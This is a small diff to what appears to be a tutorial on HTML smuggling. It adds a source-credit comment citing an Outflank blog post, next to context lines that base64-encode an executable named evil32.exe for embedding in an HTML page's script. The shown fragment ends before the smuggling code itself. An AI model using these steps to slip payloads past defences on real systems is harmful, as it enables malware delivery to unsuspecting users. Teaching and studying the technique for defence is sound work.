@@ -15,6 +15,7 @@ base64.exe C:\experiments\evil32.exe > .\evil.txt
 Then we use this code and insert our base64 encoded payload into the variable `file`:
 
 ```markup
+<!-- code from https://outflank.nl/blog/2018/08/14/html-smuggling-explained/ -->
 <html>
     <body>
         <script>
